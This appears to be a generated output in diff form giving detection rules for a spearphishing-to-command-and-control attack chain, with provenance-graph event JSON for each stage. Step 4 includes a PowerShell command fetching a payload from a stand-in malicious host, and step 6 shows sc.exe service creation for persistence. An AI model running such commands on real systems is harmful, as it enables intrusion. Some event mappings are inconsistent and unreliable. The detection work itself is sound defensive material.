@@ -1,0 +1,149 @@
+<output>
+1. **Identify Email Delivery via Spearphishing**  
+   - Monitor for events where the `srcNode` is an email application (e.g., Outlook) and the `dstNode` is an email with a suspicious "From" address (e.g., "admin@fakecompany.com") and an attachment named "Invoice_2023.docx".  
+   - Set the `relation` to "Process Create" for the email application process.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Name": "Outlook",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Name": "Invoice_2023.docx",
+         "Type": "File"
+       },
+       "relation": "Process Create"
+     }
+     ```
+
+2. **Monitor User Interaction with Email Attachments**  
+   - Track events where the `srcNode` is the Outlook process and the `dstNode` is the attachment being opened.  
+   - Set the `relation` to "Process Create" for the Outlook process when the user clicks to enable macros.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Name": "Outlook",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Name": "Invoice_2023.docx",
+         "Type": "File"
+       },
+       "relation": "Process Create"
+     }
+     ```
+
+3. **Detect Execution of Malicious Macro**  
+   - Monitor for events where the `srcNode` is Microsoft Word and the `dstNode` is a script or process spawned by Word.  
+   - Set the `relation` to "Process Create" for the Word process when the macro executes.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Image": "C:\\Windows\\System32\\cmd.exe",
+         "Type": "Process"
+       },
+       "relation": "Process Create"
+     }
+     ```
+
+4. **Track Payload Download via PowerShell**  
+   - Monitor for events where the `srcNode` is PowerShell and the `dstNode` is the downloaded executable file.  
+   - Set the `relation` to "Process Create" for the PowerShell process executing the download command.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "Cmdline": "Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\\Users\\User\\Downloads\\payload.exe",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Image": "C:\\Users\\User\\Downloads\\payload.exe",
+         "Type": "File"
+       },
+       "relation": "Process Create"
+     }
+     ```
+
+5. **Detect Execution of Malicious Payload**  
+   - Monitor for events where the `srcNode` is Windows Explorer and the `dstNode` is the downloaded executable file.  
+   - Set the `relation` to "Process Create" for the Windows Explorer process when the user executes the payload.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\explorer.exe",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Image": "C:\\Users\\User\\Downloads\\payload.exe",
+         "Type": "File"
+       },
+       "relation": "Process Create"
+     }
+     ```
+
+6. **Monitor for Establishing Persistence via New Service Creation**  
+   - Track events where the `srcNode` is a service management tool (e.g., sc.exe) and the `dstNode` is the new service being created.  
+   - Set the `relation` to "Process Create" for the service creation command.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\System32\\sc.exe",
+         "Cmdline": "create MaliciousService binPath= \"C:\\Path\\To\\Malicious.exe\"",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Name": "MaliciousService",
+         "Type": "Registry"
+       },
+       "relation": "Process Create"
+     }
+     ```
+
+7. **Detect Command and Control Communication**  
+   - Monitor for events where the `srcNode` is PowerShell and the `dstNode` is a network connection to a known malicious IP.  
+   - Set the `relation` to "TCP Connect" for the PowerShell process initiating the outbound connection.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Dstaddress": "192.0.2.1",
+         "Port": 80,
+         "Type": "Network"
+       },
+       "relation": "TCP Connect"
+     }
+     ```
+
+8. **Monitor for Lateral Movement via Remote Access Tools**  
+   - Track events where the `srcNode` is a remote access tool (e.g., AnyDesk) and the `dstNode` is another internal host.  
+   - Set the `relation` to "TCP Connect" for the remote access tool process initiating the connection.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Program Files\\AnyDesk\\AnyDesk.exe",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Dstaddress": "192.168.1.10",
+         "Port": 443,
+         "Type": "Network"
+       },
+       "relation": "TCP Connect"
+     }
+     ```
+</output>
